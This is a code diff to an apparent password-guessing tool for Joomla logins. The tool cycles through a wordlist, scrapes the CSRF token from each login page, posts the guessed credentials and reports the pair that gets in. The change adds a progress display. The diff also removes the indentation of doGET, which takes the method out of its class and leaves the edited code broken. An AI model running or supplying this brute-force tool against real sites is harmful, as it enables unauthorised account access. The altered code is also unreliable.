@@ -4,6 +4,8 @@ import requests
 from bs4 import BeautifulSoup
 import argparse
 from urllib.parse import urlparse
+import sys  # Import sys to use sys.stdout.flush()
+
 
 class bcolors:
     HEADER = '\033[95m'
@@ -71,36 +73,46 @@ class Joomla():
         else:
             self.doGET()
 
-    def doGET(self):
-        for password in self.getdata(self.wordlistfile):
-            #Custom user-agent :)
-            headers = {
-                'User-Agent': 'nano'
-            }
+def doGET(self):
+    passwords = self.getdata(self.wordlistfile)  # Load all passwords
+    total_passwords = len(passwords)  # Total number of passwords
+    current_password_index = 1  # Initialize password index
 
-            #First GET for CSSRF
-            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
-            soup = BeautifulSoup(r.text, 'html.parser')
-            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
-            password=password.decode('utf-8')
+    for password in passwords:
+        # Dynamically update the progress message in one line
+        sys.stdout.write(f'\rtrying password {current_password_index} of {total_passwords}: {password.decode("utf-8")}')
+        sys.stdout.flush()  # Ensure the line is updated immediately
 
-            data = {
-                'username' : self.username,
-                'passwd' : password,
-                'option' : self.option,
-                'task' : self.task,
-                'return' : self.ret,
-                longstring : 1
-            }
-            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
-            soup = BeautifulSoup(r.text, 'html.parser')
-            response = soup.find('div', {'class': 'alert-message'})
-            if response:
-                if self.verbose:
-                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
-            else:
-                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
-                break
+        # Custom user-agent
+        headers = {'User-Agent': 'nano'}
+
+        # First GET for CSSRF
+        r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
+        password = password.decode('utf-8')
+
+        data = {
+            'username': self.username,
+            'passwd': password,
+            'option': self.option,
+            'task': self.task,
+            'return': self.ret,
+            longstring: 1
+        }
+
+        r = requests.post(self.url, data=data, proxies=self.proxy, cookies=self.cookies, headers=headers)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        response = soup.find('div', {'class': 'alert-message'})
+        
+        if response and self.verbose:
+            print(f'\n{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for failed attempts
+        elif not response:
+            print(f'\n{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for successful attempts
+            break
+        
+        current_password_index += 1  # Increment the password index
+
 
     @staticmethod
     def getdata(path):
